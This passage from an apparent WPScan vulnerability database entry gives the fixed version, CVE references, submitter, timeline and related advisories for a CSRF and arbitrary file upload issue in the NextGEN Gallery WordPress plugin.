nextgen-gallery](https://a8cteam5105.wordpress.com/plugin/nextgen-gallery/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.0.77.3

### References

CVE
[CVE-2015-1784](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1784)

CVE
[CVE-2015-1785](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1785)

URL
<https://blog.nettitude.com/uk/crsf-and-unsafe-arbitrary-file-upload-in-nextgen-gallery-plugin-for-wordpress>

### Miscellaneous

Submitter
Louie Augarde

Submitter twitter
[Nettitude\_com](//twitter.com/Nettitude_com)

Verified
No

WPVDB ID
[c894727a-b779-4583-a860-13c2c27275d4](https://a8cteam5105.wordpress.com/vulnerability/c894727a-b779-4583-a860-13c2c27275d4/)

### Timeline

Publicly Published
2015-03-25 (about 9 years ago)

Added
2015-03-25 (about 9 years ago)

Last Updated
2021-02-08 (about 3 years ago)

### Other

Published
Title

Published
2014-08-01
Title
[wp-seo-spy-google - ofc\_upload\_image.php Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/6f7e415c-ac79-4a9a-9efe-5629bcae1887/)

Published
2023-02-13
Title
[WooCommerce Checkout Field Manager < 18.0 - Unauthenticated Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/4dc72cd2-81d7-4a66-86bd-c9cfaf690eed/)

Published
2021-06-24
Title
[ZoomSounds < 6.05 - Unauthenticated Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/07259a61-8ba9-4dd0-8d52-cc1df389c0ad/)

Published
2022-02-07
Title
[All-in-One WP Migration < 7.41 - Admin+ Arbitrary File Upload to RCE](https://a8cteam5105.wordpress.com/vulnerability/87c6052c-2628-4987-a9a3-a03b5ca1e083/)

Published
2024-12-17
Title
[WPLMS < 1.9.9.5.3 - Authenticated (Subscriber+) Arbitrary File Upload](https://a8cteam5105.wordpress.com/vulnerability/e7cdcf96-158e-4618-af87-01e02a11a7e1/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,401 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

